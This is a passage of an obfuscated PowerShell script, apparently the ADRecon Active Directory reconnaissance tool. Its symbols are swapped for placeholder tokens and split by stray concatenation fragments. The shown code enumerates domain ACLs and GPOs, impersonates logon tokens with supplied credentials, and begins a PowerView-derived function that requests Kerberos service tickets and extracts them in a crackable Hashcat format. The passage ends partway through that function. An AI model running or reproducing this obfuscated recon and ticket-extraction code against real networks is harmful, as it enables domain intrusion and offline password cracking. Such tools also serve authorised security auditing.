                    xfJ4S-1-5-32-560xfJ4  { xfJ4BUILTINcnIWindows Authorization Access GroupxfJ4 }
                    xfJ4S-1-5-32-561xfJ4  { xfJ4BUILTINcnITerminal Server License ServersxfJ4 }
                    xfJ4S-1-5-32-562xfJ4  { xfJ4BUILTINcnIDistributed COM UsersxfJ4 }
                    xfJ4S-1-5-32-569xfJ4  { xfJ4BUILTINcnICryptographic OperatorsxfJ4 }
                    xfJ4S-1-5-32-573xfJ4  { xfJ4BUILTINcnIEvent Log R'+'eadersxfJ4 }
                    xfJ4S-1-5-32-574xfJ4  { xfJ4BUILTINcnICertificate Service DCOM AccessxfJ4 }
                    xfJ4S-1-5-32-575xfJ4  { xfJ4BUILTINcnIRDS Remote Access ServersxfJ4 }
                    xfJ4S-1-5-32-576xfJ4  { xfJ4BUILTINcnIRDS Endpoint ServersxfJ4 }
                    xfJ4S-1-5-32-577xfJ4  { xfJ4BUILTINcnIRDS Management ServersxfJ4 }
                    xfJ4S-1-5-32-578xfJ4  { xfJ4BUILTINcnIHyper-V AdministratorsxfJ4 }
                    xfJ4S-1-5-32-579xfJ4  { xfJ4BUILTINcnIAccess Control Assistance OperatorsxfJ4 }
                    xfJ4S-1-5-32-580xfJ4  { xfJ4BUILTINcnIRemote Management UsersxfJ4 }
                    Default {
                        # based on Convert-ADName function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
                        If ( (bLHTargetSid -match xfJ4^S-1-.*xfJ4) -and (bLHResolveSID) )
                        {
                            If (bLHMethod -eq xfJ4ADWSxfJ4)
                            {
                                Try
                                {
                                    bLHADObject = Get-ADObject -Filter lEzjobjectSid -eq xfJ4bLHTargetSidxfJ4lEzj -Properties DistinguishedName,sAMAccountName
                                }
                                Catch
                                {
                  '+'                  Write-Warning lEzj[ConvertFrom-SID] Error while enumerating Object using SIDlEzj
                                    Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                                }
                                If (bLHADObject)
                                {
                                    bLHUserDomain = Get-DNtoFQDN -ADObjectDN bLHADObject.DistinguishedName
                                    bLHADSOutput = bLHUserDomain + lEzjcnIlEzj + bLHADObject.sAMAccountName
                                    Remove-Variable UserDomain
                                }
                            }

                            If (bLHMethod -eq xfJ4LDAPxfJ4)
  '+'                          {
         '+'                       If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    bLHADObject = New-Object System.DirectoryServices.DirectoryEntry(lEzjLDAP://bLHDomainFQDN/<SID=bLHTargetSid>lEzj,(bLHCredential.GetNetworkCredential()).UserName,(bLHCredential.GetNetworkCredential()).Password)
                                }
                                Else
                                {
                                    bLHADObject = New-Object System.DirectoryServices.DirectoryEntry(lEzjLDAP://bLHDomainFQDN/<SID=bLHTargetSid>lEzj)
                                }
                                If (bLHADObject)
                                {
                                    If (-Not ([string]::IsNullOrEmpty(bLHADObject.Properties.samaccountname)) )
                                    {
                                        bLHUserDomain = Get-DNtoFQDN -ADObjectDN bLH([string] (bLHADObject.Properties.distinguishedname))
                                        bLHADSOutput = bLHUserDomain + lEzjcnIlEzj + bLH([string] (bLHADObject.Properties.samaccountname))
                                        Remove-Variable UserDomain
                                    }
                                }
                            }

                            If ( (-Not bLHADSOutput) -or ([string]::IsNullOrEmpty(bLHADSOutput)) )
                            {
                                bLHADSOutputType = bLHADS_NAME_TYPE_NT4
                                bLHInit = bLHtrue
                                bLHTranslate = New-Object -ComObject NameTranslate
                                If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
                                {
                                    bLHADSInitType = bLHA'+'DS_NAME_INITTYPE_DOMAIN
                                    Try
                                    '+'{
                                        [System.__ComObject].InvokeMember(lEzjInitExlEzj,lEzjInvokeMethodlEzj,bLHnull,bLHTranslate,bLH(@(bLHADSInitType,bLHDomainFQDN,(bLHCredential.GetNetworkCredential()).UserName,bLHDomainFQDN,(bLHCredential.GetNetworkCredential()).Password)))
                                    }
                                    Catch
                                    {
                                        bLHInit = bLHfalse
                                        #Write-Verbose lEzj[ConvertFrom-SID] Error initializing translation for bLH(bLHTargetSid) using alternate credentialslEzj
                                        #Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                                    }
                                }
                                Else
                          '+'   '+'   {
                                    bLHADSInitType = bLHADS_NAME_INITTYPE_GC
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(lEzjInitlEzj,lEzjInvokeMethodlEzj,bLHnull,bLHTranslate,(bLHADSInitType,bLHnull))
                                    }
                                    Catch
                                    {
                                        bLHInit = bLHfalse
                                        #Write-Verbose lEzj[ConvertFrom-SID] Error initializing translation for bLH(bLHTargetSid)lEzj
                                        #Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                                    }
                                }
                                If (bLHInit)
                                {
                                    [System.__ComObject].InvokeMember(lEzjChaseReferrallEzj,lEzjSetPropertylEzj,bLHnull,bLHTranslate,bLHADS_CHASE_REFERRALS_ALWAYS)
                                    Try
                                    {
                                        [System.__ComObject].InvokeMember(lEzjSetlEzj,lEzjInvokeMethodlEzj,bLHnull,bLHTranslate,(bLHADS_NAME_TYPE_UNKNOWN, bLHTargetSID))
                                        bLHADSOutput = [System.__ComObject].InvokeMember(lEzjGetlEzj,lEzjInvokeMethodlEzj,bLHnull,bLHTranslate,bLHADSOutputType)
                                    }
                                    Catch
                                    {
                                        #Write-Verbose lEzj[ConvertFrom-SID] Error translating bLH(bLHTargetSid)lEzj
                                        #Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
                                    }
                                }
                            }
                        }
                        If (-Not ([string]::IsNullOrEmpty(bLHADSOutput)) )
                        {
                            Return bLHADSOutput
                        }
                        Else
                        {
                            Return bLHTargetSid
                        }
                    }
                }
            }
            Catch
            {
                #Write-Output lEzj[ConvertFrom-SID] Error converting SID bLH(bLHTargetSid)lEzj
                #Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
        }
        Else
        {
            Return bLHTargetSid
        }
    }
}

# based on https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
Function Get-ADRACL
{
<#
.SYNOPSIS
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.DESCRIPTION
    Returns all ACLs for the Domain, OUs, Root Containers, GPO, User, Computer and Group objects in the current (or specified) domain.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER objDomain
    [DirectoryServices.DirectoryEntry]
    Domain Directory Entry object.

.PARAMETER DomainController
    [string]
    IP Address of the Domain Controller.

.PARAMETER Credential
    [Management.Automation.PSCredential]
    Credentials.

.PARAMETER ResolveSIDs
    [bool]
    Whether to resolve SIDs in the ACLs module. (Default False)

.PARAMETER PageSize
    [int]
    The PageSize to set for the LDAP searcher object. Default 200.

.PARAMETER Threads
    [int]
    The number of threads to use during processing of objects. Default 10.

.OUTPUTS
    PSObject.

.LINK
    https://gallery.technet.microsoft.com/Active-Directory-OU-1d09f989
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHfalse)]
        [DirectoryServices.DirectoryEntry] bLHobjDomain,

        [Parameter(Mandatory = bLHfalse)]
        [string] bLHDomainController,

        [Parameter(Mandatory = bLHfalse)]
        [Management.Automation.PSCredential] bLHCredential = [Management.Automation.PSCredential]::Empty,

        [Parameter(Mandatory = bLHfalse)]
        [bool] bLHResolveSID = bLHfalse,

        [Parameter(Mandatory = bLHtrue)]
        [int] bLHPageSize,

        [Parameter(Mandatory = bLHf'+'alse)]
        [int] bLHThreads = 10
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        If (bLHCredential -eq [Management.Automation.PSCredential]::Empty)
        {
            If (Test-Path AD:)
        '+'    {
      '+'          Set-Location AD:
            }
            Else
            {
                Write-Warning lEzjDefault AD drive not found ... Skipping ACL enumerationlEzj
                Return bLHnull
            }
        }
        bLHGUIDs = @{xfJ400000000-0000-0000-0000-000000000000xfJ4 = xfJ4AllxfJ4}
        Try
        {
            Write-Verbose lEzj[*] Enumerating schemaIDslEzj
            bLHschemaIDs = Get-ADObject -SearchBase (Get-ADRootDSE).schemaNamingContext -LDAPFilter xfJ4(schemaIDGUID=*)xfJ4 -Properties name, schemaIDGUID
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRACL] Error while enumerating schemaIDslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }

        If (bLHschemaIDs)
        {
            bLHschemaIDs 0Ogv Where-Object {bLH_} 0Ogv ForEach-Object {
                # convert the GUID
                bLHGUIDs[(New-Object Guid (,bLH_.schemaIDGUID)).Guid] = bLH_.name
            }
            Remove-Variable schemaIDs
        }

        Try
        {
            Write-Verbose lEzj[*] Enumerating Active Directory RightslEzj
            bLHschemaIDs = Get-ADObject -SearchBase lEzjCN=Extended-Rights,bLH((Get-ADRootDSE).configurationNamingContext)lEzj -LDAPFilter xfJ4(objectClass=controlAccessRight)xfJ4 -Properties name, rightsGUID
        }
        Catch
        {
      '+'      Write-Warning lEzj[Get-ADRACL] Error while enumerating Active Directory RightslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }

        If (bLHschemaIDs)
        {
            bLHschemaIDs 0Ogv Where-Object {bLH_} 0Ogv ForEach-Object {
                # convert the GUID
                bLHGUIDs[(New-Object Guid (,bLH_.rightsGUID)).Guid] = bLH_.name
            }
            Remove-Variable schemaIDs
        }

        # Get the DistinguishedNames of Domain, OUs, Root Containers and GroupPolicy objects.
        bLHObjs = @()
        Try
        {
            bLHADDomain = Get-ADDomain
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRACL] Error getting Domain ContextlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }

        Try
        {
            Write-Verbose lEzj[*] Enumerating Domain, OU, GPO, User, Computer and Group ObjectslEzj
            bLHObjs += Get-ADObject -LDAPFilter xfJ4(0Ogv(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))xfJ4 -Properties DisplayName, DistinguishedName, Name, ntsecuritydescriptor, ObjectClass, objectsid
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }

        If (bLHADDomain)
        {
            Try
            {
                Write-Verbose lEzj[*] Enumerating Root Container ObjectslEzj
                bLHObjs += Get-ADObject -SearchBase bLH(bLHADDomain.DistinguishedName) -SearchScope OneLevel -LDAPFilter xfJ4(objectClass=container)xfJ4 -Properties DistinguishedName, Name, ntsecuritydescriptor, ObjectClass
            }
            Catch
            {
                Write-W'+'arning lEzj[Get-ADRACL] Error while enumerating Root Container ObjectslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
        }

        If (bLHObjs)
        {
            bLHACLObj = @()
            Write-Verbose lEzj[*] Total Objects: bLH([ADRecon.ADWSClass]::ObjectCount(bLHObjs))lEzj
            Write-Verbose lEzj[-] DACLslEzj
            bLHDACLObj = [ADRecon.ADWSClass]::DACLParser(bLHObjs, bLHGUIDs, bLHThreads)
            #Write-Verbose lEzj[-] SACLs - May need a Privileged AccountlEzj
            Write-Warning lEzj[*] SACLs - Currently, the module is only supported with LDAP.lEzj
            #bLHSACLObj = [ADRecon.ADWSClass]::SACLParser(bLHObjs, bLHGUIDs, bLHThreads)
            Remove-Variable O'+'bjs
            Remove-Variable GUIDs
        }
    }

    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        bLHGUIDs = @{xfJ400000000-0000-0000-0000-000000000000xfJ4 = xfJ4AllxfJ4}

        If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
        {
            bLHDomainFQDN = Get-DNtoFQDN(bLHobjDomain.distinguishedName)
            bLHDomainContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjDomainlEzj,bLH(bLHDomainFQDN),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
            Try
            {
                bLHADDomain = [System.Dire'+'ctoryServices.ActiveDirectory.Domain]::GetDomain(bLHDomainContext)
            }
            Catch
            {
               '+' Write-Warning lEzj[Get-ADRACL] Error getting Domain ContextlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }

            Try
            {
                bLHForestContext = New-Object System.DirectoryServices.ActiveDirectory.DirectoryContext(lEzjForestlEzj,bLH(bLHADDomain.Forest),bLH(bLHCredential.UserName),bLH(bLHCredential.GetNetworkCredential().password))
                bLHADForest = [System.DirectoryServices.ActiveDir'+'ectory.Forest]::GetForest(bLHForestContext)
                bLHSchemaPath = bLHADForest.Schema.Name
                Remove-Variable ADForest
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRACL] Error enumerating SchemaPathlEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }
        }
        Else
        {
            bLHADDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
            bLHADForest = [System.DirectoryServices.ActiveDirectory.Forest]::GetCurrentForest()
            bLHSchemaPath = bLHADForest.Schema.Name
            Remove-Variable ADForest
        }

        If (bLHSchemaPath)
        {
            Write-Verbose lEzj[*] Enumerating schemaIDslEzj
            If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
            {
                bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLHSchemaPath)lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
            }
            Else
            {
                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] lEzjLDAP://bLH(bLHSchemaPath)lEzj)
            }
            bLHobjSearcherPath.PageSize = bLHPageSize
            bLHobjSearcherPath.filter = lEzj(schemaIDGUID=*)lEzj

            Try
           '+' {
                bLHSchemaSearcher = bLHobjSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRACL] Error enumerating SchemaIDslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
'+'            }

            If (bLHSchemaSearcher)
            {
                bLHSchemaSearcher 0Ogv Where-Object {bLH_} 0Ogv ForEach-Object {
                    # convert the GUID
                    bLHGUIDs[(New-Object Guid (,bLH_.properties.schemaidguid[0])).Guid] = bLH_.properties.name[0]
                }
                bLHSchemaSearcher.dispose()
            }
            bLHobjSearcherPath.dispose()

            Write-Verbose lEzj[*] Enumerating Active Directory RightslEzj
            If (bLHCredential -ne [Management.Automation.PSCredential]::Empty)
            {
                bLHobjSearchPath = New-Object System.DirectoryServices.DirectoryEntry lEzjLDAP://bLH(bLHDomainController)/bLH(bLHSchemaPath.replace(lEzjSchemalEzj,lEzjExtended-RightslEzj))lEzj, bLHCredential.UserName,bLHCredential.GetNetworkCredential().Password
                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher bLHobjSearchPath
            }
            Else
            {
                bLHobjSearcherPath = New-Object System.DirectoryServices.DirectorySearcher ([ADSI] lEzjLDAP://bLH(bLHSchemaPath.replace(lEzjSchemalEzj,lEzjExtended-RightslEzj))lEzj)
            }
            bLHobjSearcherPath.PageSize = bLHPageSize
            bLHobjSearcherPath.filter = lEzj(objectClass=controlAccessRight)lEzj

            Try
            {
                bLHRightsSearcher = bLHobjSearcherPath.FindAll()
            }
            Catch
            {
                Write-Warning lEzj[Get-ADRACL] Error enumerating Active Directory RightslEzj
                Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            }

            If (bLHRightsSearcher)
            {
                bLHRightsSearcher 0Ogv Where-Object {bLH_} 0Ogv ForEach-Object {
                    # convert the GUID
                    bLHGUIDs[bLH_.properties.rightsguid[0].toString()] = bLH_.properties.name[0]
                }
                bLHRightsSearcher.dispose()
            }
            bLHobjSearcherPath.dispose()
        }

        # Get the Domain, OUs, Root Containers, GPO, User, Computer and Group objects.
        bLHObjs = @()
        Write-Verbose lEzj[*] Enumerating Domain, OU, GPO, User, Computer and Group ObjectslEzj
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(0Ogv(objectClass=domain)(objectCategory=organizationalunit)(objectCategory=groupPolicyContainer)(samAccountType=805306368)(samAccountType=805306369)(samaccounttype=268435456)(samaccounttype=268435457)(samaccounttype=536870912)(samaccounttype=536870913))lEzj
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        bLHObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdisplaynamelEzj,lEzjdistinguishednamelEzj,lEzjnamelEzj,lEzjntsecuritydescriptorlEzj,lEzjobjectclasslEzj,lEzjobjectsidlEzj))
        bLHObjSearcher.SearchScope = lEzjSubtreelEzj

        Try
        {
            bLHObjs += bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRACL] Error while enumerating Domain, OU, GPO, User, Computer and Group ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        bLHObjSearcher.dispose()

        Write-Verbose lEzj[*] Enumerating Root Container ObjectslEzj
        bLHobjSearcher = New-Object System.DirectoryServices.DirectorySearcher bLHobjDomain
        bLHObjSearcher.PageSize = bLHPageSize
        bLHObjSearcher.Filter = lEzj(objectClass=container)lEzj
        # https://msdn.microsoft.com/en-us/library/system.directoryservices.securitymasks(v=vs.110).aspx
        bLHObjSearcher.SecurityMasks = bLHObjSearcher.SecurityMasks = [System.DirectoryServices.SecurityMasks]::Dacl -bor [System.DirectoryServices.SecurityMasks]::Group -bor [System.DirectoryServices.SecurityMasks]::Owner -bor [System.DirectoryServices.SecurityMasks]::Sacl
        bLHObjSearcher.PropertiesToLoad.AddRange((lEzjdistinguishednamelEzj,lEzjnamelEzj,lEzjntsecuritydescriptorlEzj,lEzjobjectclasslEzj))
        bLHObjSearcher.SearchScope = lEzjOneLevellEzj

        Try
        {
            bLHObjs += bLHObjSearcher.FindAll()
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRACL] Error while enumerating Root Container ObjectslEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        bLHObjSearcher.dispose()

        If (bLHObjs)
        {
            Write-Verbose lEzj[*] Total Objects: bLH([ADRecon.LDAPClass]::ObjectCount(bLHObjs))lEzj
            Write-Verbose lEzj[-] DACLslEzj
            bLHDACLObj = [ADRecon.LDAPClass]::DACLParser(bLHObjs, bLHGUIDs, bLHThreads)
            Write-Verbose lEzj[-] SACLs - May need a Privileged AccountlEzj
            bLHSACLObj = [ADRecon.LDAPClass]::SACLParser(bLHObjs, bLHGUIDs, bLHThreads)
            Remove-Variable Objs
            Remove-Variable GUIDs
        }
    }

    If (bLHDACLObj)
    {
        Export-ADR bLHDACLObj bLHADROutputDir bLHOutputType lEzjDACLslEzj
        Remove-Variable DACLObj
    }

    If (bLHSACLObj)
    {
        Export-ADR bLHSACLObj bLHADROutputDir bLHOutputType lEzjSACLslEzj
        Remove-Variable SACLObj
    }
}

Function Get-ADRGPOReport
{
<#
.SYNOPSIS
    Runs the Get-GPOReport cmdlet if available.

.DESCRIPTION
    Runs the Get-GPOReport cmdlet if available and saves in HTML and XML formats.

.PARAMETER Method
    [string]
    Which method to use; ADWS (default), LDAP.

.PARAMETER UseAltCreds
    [bool]
    Whether to use provided credentials or not.

.PARAMETER ADROutputDir
    [string]
    Path for ADRecon output folder.

.OUTPUTS
    HTML and XML GPOReports are created in the folder specified.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHMethod,

        [Parameter(Mandatory = bLHtrue)]
        [bool] bLHUseAltCreds,

   '+'     [Parameter(Mandatory = bLHtrue)]
        [string] bLHADROutputDir
    )

    If (bLHMethod -eq xfJ4ADWSxfJ4)
    {
        Try
        {
            # Suppress verbose output on module import
            bLHSaveVerbosePreference = bLHscript:VerbosePreference
            bLHscript:VerbosePreference = xfJ4SilentlyContinuexfJ4
            Import-Module GroupPolicy -WarningAction Stop -ErrorAction Stop 0Ogv Out-Null
            If (bLHSaveVerbosePreference)
            {
                bLHscript:VerbosePreference = bLHSaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
        }
        Catch
        {
            Write-Warning lEzj[Get-ADRGPOReport] Error importing the GroupPolicy Module. Skipping GPOReportlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
            '+'If (bLHSaveVerbosePreference)
            {
                bLHscript:VerbosePreference = bLHSaveVerbosePreference
                Remove-Variable SaveVerbosePreference
            }
            Return bLHnull
        }
        Try
        {
            Write-Verbose lEzj[*] GPOReport XMLlEzj
            bLHADFileName = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4GPO-ReportxfJ4,xfJ4.xmlxfJ4)
            Get-GPOReport -All -ReportType XML -Path bLHADFileName
        }
        Catch
        {
            If (bLHUseAltCreds)
            {
                Write-Warning lEzj[*] Run the tool using RUNAS.lEzj
                Write-Warning lEzj[*] runas /user:<Domain FQDN>cnI<Username> /netonly powershell.exelEzj
                Return bLHnull
            }
            Write-Warning lEzj[Get-ADRGPOReport] Error getting the GPOReport in XMLlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
        Try
        {
            Write-Verbose lEzj[*] GPOReport HTMLlEzj
            bLHADFileName = -join(bLHADROutputDir,xfJ4cnIxfJ4,xfJ4GPO-ReportxfJ4,xfJ4.h'+'tmlxfJ4)
            Get-GPOReport -All -ReportType HTML -Path bLHADFileName
        }
        Catch
        {
            If (bLHUseAltCreds)
            {
                Write-Warning lEzj[*] Run the tool using RUNAS.lEzj
                Write-Warning lEzj[*] runas /user:<Domain FQDN>cnI<Username> /netonly powershell.exelEzj
                Return bLHnull
            }
            Write-Warning lEzj[Get-ADRGPOReport] Error getting the GPOReport in XMLlEzj
            Write-Verbose lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        }
    }
    If (bLHMethod -eq xfJ4LDAPxfJ4)
    {
        Write-Warning lEzj[*] Currently, the module is only supported with ADWS.lEzj
    }
}

# Modified Invoke-UserImpersonation function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRUserImpersonation
{
<#
.SYNOPSIS

C'+'reates a new lEzjrunas /netonlylEzj type logon and impersonates the token.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses LogonUser() with the LOGON32_LOGON_NEW_CREDENTIALS LogonType
to simulate lEzjrunas /netonlylEzj. The resulting token is then impersonated with
ImpersonateLoggedOnUser() and the token handle is returned for later usage
with Invoke-RevertToSelf.

.PARAMETER Credential

A [Management.Automation.PSCredential] object with alternate credentials
to impersonate in the current thread space.

.PARAMETER TokenHandle

An IntPtr TokenHandle returned by a previous Invoke-UserImpersonation.
If this is supplied, LogonUser() is skipped and only ImpersonateLoggedOnUser()
is executed.

.PARAMETER Quiet

Suppress any warnings about STA vs MTA.

.EXAMPLE

bLHSecPassword = ConvertTo-SecureString xfJ4Password123!xfJ4 -AsPlainText -Force
bLHCred = New-Object System.Management.Automation.PSCredential(xfJ4TESTLABcnIdfm.axfJ4, bLHSecPassword)
Invoke-UserImpersonation -Credential bLHCred

.OUTPUTS

IntPtr

The TokenHandle result from LogonUser.
#>

    [OutputType([IntPtr])]
    [CmdletBinding(DefaultParameterSetName = xfJ4CredentialxfJ4)]
    Param(
        [Parameter(Mandatory = bLHTrue, Par'+'ameterSetName = xfJ4CredentialxfJ4)]
        [Management.Automation.PSCredential]
   '+'     [Management.Automation.CredentialAttribute()]
        bLHCredential,

        [Parameter(Mandatory = bLHTrue, ParameterSetName = xfJ4TokenHandlexfJ4)]
        [ValidateNotNull()]
        [IntPtr]
        bLHTokenHandle,

        [Switch]
        bLHQuiet
    )

    If (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne xfJ4STAxfJ4) -and (-not bLHPSBoundParameters[xfJ4QuietxfJ4]))
    {
        Write-Warning lEzj[Get-ADRUserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work.lEzj
    }

    If (bLHPSBoundParameters[xfJ4TokenHandlexfJ4])
    {
        bLHLogonTokenHandle = bLHTokenHandle
    }
    Else
    {
        bLHLogonTokenHandle = [IntPtr]::Zero
        bLHNetworkCredential = bLHCredential.GetNetworkCredential()
        bLHUserDomain = bLHNetworkCredential.Domain
        If (-Not bLHUserDomain)
        {
            Write-Warning lEzj[Get-ADRUserImpersonation] Use credential with Domain FQDN. (<Domain FQDN>cnI<Username>)lEzj
        }
        bLHUserName = bLHNetworkCredential.UserName
        Write-Warning lEzj[Get-ADRUserImpersonation] Executing LogonUser() with user: bLH(bLHUserDomain)cnIbLH(bLHUserName)lEzj

        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
        #   this is to simulate lEzjrunas.exe /netonlylEzj functionality
        bLHResult = bLHAdvapi32::LogonUser(bLHUserName, bLHUserDomain, bLHNetworkCredential.Password, 9, 3, [ref]bLHLogonTokenHandle)
        bLHLastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

        If (-not bLHResult)
        {
            throw lEzj[Get-ADRUserImpersonation] LogonUser() Error: bLH(([ComponentModel.Win32Exception] bLHLastError).Message)lEzj
        }
    }

    # actually impersonate the token from LogonUser()
    bLHResult = bLHAdvapi32::ImpersonateLoggedOnUser(bLHLogonTokenHandle)

    If (-not bLHResult)
    {
        throw lEzj[Get-ADRUserImpersonation] ImpersonateLoggedOnUser() Error: bLH(([ComponentModel.Win32Exception] bLHLastError).Message)lEzj
    }

    Write-Verbose lEzj[Get-ADR-UserImpersonation] Alternate credentials successfully impersonatedlEzj
    bLHLogonTokenHandle
}

# Modified Invoke-RevertToSelf function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRRevertToSelf
{
<#
.SYNOPSIS

Reverts any token impersonation.

Author: Will Schroeder (@harmj0y)
License: BSD 3-Clause
Required Dependencies: PSReflect

.DESCRIPTION

This function uses RevertToSelf() to revert any impersonated tokens.
If -TokenHandle is passed (the token handle retu'+'rned by Invoke-UserImpersonation),
CloseHandle() is used to close the opened handle.

.PARAMETER TokenHandle

An optional IntPtr TokenHandle returned by Invoke-UserImpersonation.

.EXAMPLE

bLHSecPassword = ConvertTo-SecureString xfJ4Password123!xfJ4 -AsPlainText -Force
bLHCred = New-Object System.Management.Automation.PSCredential(xfJ4TESTLABcnIdfm.axfJ4, bLHSecPassword)
bLHToken = Invoke-UserImpersonation -Credential bLHCred
Invoke-RevertToSelf -TokenHandle bLHToken
#>

    [CmdletBinding()]
    Param(
        [ValidateNotNull()]
        [IntPtr]
        bLHTokenHandle
    )

    If (bLHPSBoundParameters[xfJ4TokenHandlexfJ4])
    {
        Write-Warning lEzj[Get-ADRRevertToSelf] Reverting token impersonation and closing LogonUser() token handlelEzj
        bLHResult = bLHKernel32::CloseHandle(bLHTokenHandle)
    }

    bLHResult = bLHAdvapi32::RevertToSelf()
    bLHLastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();

    If (-not bLHResult)
    {
        Write-Error lEzj[Get-ADRRevertToSelf] RevertToSelf() Error: bLH(([ComponentModel.Win32Exception] bLHLastError).Message)lEzj
    }

    Write-Verbose lEzj[Get-ADRRevertToSelf] Token impersonation successful'+'ly revertedlEzj
}

# Modified Get-DomainSPNTicket function from https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1
Function Get-ADRSPNTicket
{
<#
<#
.SYNOPSIS
    Request the kerberos ticket for a specified service principal name (SPN).

    Author: machosec, Will Schroeder (@harmj0y)
    License: BSD 3-Clause
    Required Dependencies: Invoke-UserImpersonation, Invoke-RevertToSelf

.DESCRIPTION
    This function will either take one SPN strings, and will request a kerberos ticket for the given SPN using System.IdentityModel.Tokens.KerberosRequestorSecurityToken. The encrypted portion of the ticket is then extracted and output in either crackable Hashcat format.

.PARAMETER UserSPN
    [string]
    Service Principal Name.

.OUTPUTS
    PSObject.
#>
    param(
        [Parameter(Mandatory = bLHtrue)]
        [string] bLHUserSPN
    )

    Try
    {
        bLHNull = [Reflection.Assembly]::LoadWithPartialName(xfJ4System.IdentityModelxfJ4)
        bLHTicket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList bLHUserSPN
    }
    Catch
    {
        Write-Warning lEzj[Get-ADRSPNTicket] Error requesting ticket for SPN bLHUserSPNlEzj
        Write-Warning lEzj[EXCEPTION] bLH(bLH_.Exception.Message)lEzj
        Return bLHnull
    }

    If (bLHTicket)
    {
        bLHTicketByteStream = bLHTicket.GetRequest()
    }

    If (bLHTicketByteStream)
    {
        bLHTicketHexStream = [System.BitConverter]::ToString(bLHTicketByteStream) -replace xfJ4-xfJ4

        # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
